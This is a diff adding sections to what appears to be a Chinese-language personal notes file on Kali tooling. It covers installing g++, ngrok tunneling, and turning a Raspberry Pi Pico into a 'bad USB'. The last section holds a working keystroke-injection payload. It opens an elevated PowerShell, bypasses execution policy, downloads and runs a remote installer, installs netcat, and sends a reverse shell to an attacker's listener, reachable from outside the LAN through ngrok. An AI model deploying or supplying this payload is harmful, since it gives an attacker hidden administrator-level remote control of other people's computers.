@@ -131,7 +131,17 @@ apt install unison -y
 unison 本机文件夹路径 ssh://用户名@ip:端口//虚拟机文件夹路径
 ```
 
+## 安装c++编译器
 
+安装g++编译器的命令：
+
+sudo apt-get install build-essential
+
+执行完后，就完成了gcc,g++,make的安装。build-essential是一整套工具，gcc，libc等等。
+
+通过“g++ -v”可以查看g++是否安装成功。
+
+注：“sudo apt-get install build-essential –fix-missing”，这个命令是修补安装build-essential，即已安装了部分build-essential，但没有安装完全，此时可以使用该命令继续安装build-essential。
 
 # 3. fluxion
 
@@ -444,9 +454,54 @@ https://blog.csdn.net/hktkfly6/article/details/123302335
 
 国内免费代理IP：https://zhuanlan.zhihu.com/p/395461277
 
+# 17. ngrok内网穿透
+
+通过内网穿透，可以公网ip替代私网ip，使用公网ip访问该服务。
+
+**该程序需一直保持运行，程序关闭，映射也将关闭。**如果需要关闭映射，可以使用ctrl + c 或关闭该界面，进行程序终止。每次重新执行命令，映射外网的域名都会发生改变。如果希望域名不变，可通过开通[ngrok](https://so.csdn.net/so/search?q=ngrok&spm=1001.2101.3001.7020)的会员服务，具体可在官网进行查看。
+
+安装方法自行搜索。
+
+在官网ngrok.org无法注册。
 
 
 
+# 18. 树莓派pico制作bad usb
+
+获取Windows的powershell管理员权限。
+
+流程：
+
+* 删除pico内文件，拷贝bad usb固件到其中。pico会自动断连并重新连接。
+* 连接后，删除所有文件。将bad usb目录文件拷贝其中。其中padload.dd文件为powershell脚本。
+* 在kali以`nc -lvnp <port>`监听靶机的反向shell。
+* 下面脚本的`kaliIP`可以通过ngrok内网穿透成域名。从而让不在局域网内的kali获得权限
+
+```powershell
+DELAY 200
+GUI r
+
+DELAY 200
+STRING powershell -NoP -NonI #-W hidden可隐藏powershell
+CTRL SHIFT ENTER
+
+DELAY 500
+LEFTARROW
+ENTER
+
+DELAY 500
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+ENTER
+
+DELAY 200
+STRING choco install netcat
+DELAY 200
+ENTER
+STRING Y
+ENTER
+STRING nc -e powershell.exe <kaliIP> 4444<port>	
+ENTER
+```
 
 
 
